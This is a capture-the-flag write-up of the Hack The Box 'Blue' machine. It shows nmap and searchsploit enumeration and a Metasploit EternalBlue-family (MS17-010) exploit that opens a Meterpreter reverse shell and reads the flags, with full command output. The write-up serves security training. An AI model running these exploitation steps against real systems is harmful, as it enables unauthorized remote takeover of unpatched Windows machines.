## Description
Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the `EternalBlue` exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.

## Enumeration
The first step is always to look at the open ports on the machine:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 18:32 CEST
Nmap scan report for 10.129.204.37
Host is up (0.021s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-20T16:34:20
|_  start_date: 2023-09-20T16:31:05
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-20T17:34:21+01:00
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.96 seconds
```
We can see the server is running Windows 7 Professional 6.1 with the Samba running on ports 139 and 445. I am not sure to which service corresponds the open port "Microsoft Windows RPC".
### Samba
Let's get the version of the Samba server to check for any vulnerability (even if the description of the box makes it obvious):
```
$msfconsole
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_version 
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set RHOSTS 10.129.204.37
RHOSTS => 10.129.204.37
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 10.129.204.37:445     - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:12m 31s) (guid:{c23f60e0-597a-4e2e-893f-bf6e4694d840}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[+] 10.129.204.37:445     -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:12m 31s) (guid:{c23f60e0-597a-4e2e-893f-bf6e4694d840}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[*] 10.129.204.37:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
This is surprising because it is said `SMB Detected (versions:1, 2)`. Is it the version 1 or 2?
Whatever, we can search if an exploit exist for Samba on Windows:
```
$searchsploit smb windows 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CyberCop Scanner Smbgrind 5.5 - Buffer Overflow (PoC)                                                                                                       | windows/dos/39452.txt
DOUBLEPULSAR - Payload Execution and Neutralization (Metasploit)                                                                                            | windows/remote/47456.rb
DOUBLEPULSAR - Payload Execution and Neutralization (Metasploit)                                                                                            | windows/remote/47456.rb
Microsoft - SMB Server Trans2 Zero Size Pool Alloc (MS10-054)                                                                                               | windows/dos/14607.py
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                                                             | windows/remote/16366.rb
Microsoft SMB Driver - Local Denial of Service                                                                                                              | windows/dos/28001.c
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                                   | windows/remote/43970.rb
Microsoft Windows - 'SMB' Transaction Response Handling (MS05-011)                                                                                          | windows/dos/1065.c
Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                                                        | windows/remote/48537.py
Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                                                                       | windows/remote/40280.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                                                | windows/remote/14674.txt
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                                                   | windows/remote/16363.rb
Microsoft Windows - 'WRITE_ANDX' SMB Command Handling Kernel Denial of Service (Metasploit)                                                                 | windows/dos/6463.rb
Microsoft Windows - LSASS SMB NTLM Exchange Null-Pointer Dereference (MS16-137)                                                                             | windows/dos/40744.txt
Microsoft Windows - SMB Client-Side Bug (PoC) (MS10-006)                                                                                                    | windows/dos/12258.py
Microsoft Windows - SMB Relay Code Execution (MS08-068) (Metasploit)                                                                                        | windows/remote/16360.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                                               | windows/dos/41891.rb
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                                               | windows/dos/12524.py
Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                                                        | windows/remote/7125.txt
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Buffer Overflow (PoC)                                                | windows/dos/48216.md
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation                                           | windows/local/48267.txt
Microsoft Windows 10 - SMBv3 Tree Connect (PoC)                                                                                                             | windows/dos/41222.py
Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation                                                                 | windows/local/47115.txt
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                                                              | windows/remote/20.txt
Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                                                                      | windows/remote/41929.py
Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution                                                                                               | windows/remote/44616.py
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                            | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                                                                             | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                        | windows/remote/42315.py
Microsoft Windows 8.1/2012 R2 - SMBv3 Null Pointer Dereference Denial of Service                                                                            | windows/dos/44189.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                  | windows_x86-64/remote/42030.py
Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal                                                                               | windows/remote/20371.txt
Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB Client                                                               | windows/remote/19197.txt
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                               | windows_x86-64/remote/41987.py
Microsoft Windows SMB Server (v1/v2) - Mount Point Arbitrary Device Open Privilege Escalation                                                               | windows/dos/43517.txt
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                        | windows/dos/9594.txt
Microsoft Windows XP/2000 - 'Mrxsmb.sys' Local Privilege Escalation (MS06-030)                                                                              | windows/local/1911.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                                                   | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                                                   | windows/dos/21747.txt
VideoLAN VLC Client (Windows x86) - 'smb://' URI Buffer Overflow (Metasploit)                                                                               | windows_x86/local/16678.rb
VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow                                                                             | windows/remote/9303.c
VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Universal Buffer Overflow                                                                   | windows/remote/9318.py
VideoLAN VLC Media Player 0.9.9 - 'smb://' URI Stack Buffer Overflow (PoC)                                                                                  | windows/dos/9029.rb
VideoLAN VLC Media Player 1.0.0/1.0.1 - 'smb://' URI Handling Buffer Overflow (PoC)                                                                         | windows/dos/9427.py
VideoLAN VLC Media Player 1.0.2 - 'smb://' URI Stack Overflow                                                                                               | windows/remote/9816.py
VideoLAN VLC Media Player 1.0.3 - 'smb://' URI Handling Remote Stack Overflow (PoC)                                                                         | windows/dos/10333.py
VideoLAN VLC Media Player < 1.1.4 - '.xspf smb://' URI Handling Remote Stack Overflow (PoC)                                                                 | windows/dos/14892.py
WebExec - (Authenticated) User Code Execution (Metasploit)                                                                                                  | windows/remote/45695.rb
WebExec - (Authenticated) User Code Execution (Metasploit)                                                                                                  | windows/remote/45695.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
We can see that, on Windows 7, there are 3 exploits mentioning `EternalBlue` (what a surprise!). We will try to exploit it.
## Foothold
We saw that we may exploit the Samba server with the `EternalBlue` exploit. Let's look if `Metasploit` have an exploit for it:
```
[msf](Jobs:0 Agents:0) >> search exploit eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/smb/smb_doublepulsar_rce
```
Apparently, there are multiple exploits. The last one is ranked "great" but it does not talk about `EternalBlue` or MS17-10, so I prefer to look at the second one:
```
[msf](Jobs:0 Agents:0) >> use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                        Required  Description
   ----                  ---------------                                        --------  -----------
   DBGTRACE              false                                                  yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                     yes       How many times to try to leak transaction
   NAMEDPIPE                                                                    no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_  yes       List of named pipes to check
                         pipes.txt
   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                                                                          html
   RPORT                 445                                                    yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                          no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                         no        The service display name
   SERVICE_NAME                                                                 no        The service name
   SHARE                 ADMIN$                                                 yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                      no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.87     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set rhosts 10.129.204.37
rhosts => 10.129.204.37
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set lhost tun0
lhost => 10.10.14.86
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run

[*] Started reverse TCP handler on 10.10.14.86:4444 
[*] 10.129.204.37:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.129.204.37:445 - Built a write-what-where primitive...
[+] 10.129.204.37:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.204.37:445 - Selecting PowerShell target
[*] 10.129.204.37:445 - Executing the payload...
[+] 10.129.204.37:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.129.204.37
[*] Meterpreter session 1 opened (10.10.14.86:4444 -> 10.129.204.37:49158) at 2023-09-20 18:59:51 +0200
```
Bingo! Let's get a shell and look for the flags:
```
(Meterpreter 1)(C:\Windows\system32) > shell
Process 1728 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\System32>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,693,275,648 bytes free
```
As we are logged as `system`, we can get both flags:
```
C:\Users>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
a[...SNIP...]c

C:\Users>type haris\Desktop\user.txt
type haris\Desktop\user.txt
4[...SNIP...]0
```
## Learning from other writeups
### rana-khalil writeup
We can find the writeup here: https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit
What I find interesting is the use of the "vulnerable" scripts of nmap to check if the samba server is vulnerable to `EternalBlue`. It seems much more relevant that my research using searchsploit:
```
$nmap --script vuln -p 135,139,445,49152-49157 10.129.204.37
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 19:15 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.204.37
Host is up (0.021s latency).

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Nmap done: 1 IP address (1 host up) scanned in 133.50 seconds
```
We can directly see that the Samba server is vulnerable to ms17-010 (`EternalBlue`).
## Lessons learned
Reading the description of the box before starting really spoiled the game as I knew the vulnerability was `EternalBlue`. I am wondering how I would be able to find it without having this information. With what I learned from the writeup, I would use `vuln` scripts from nmap.
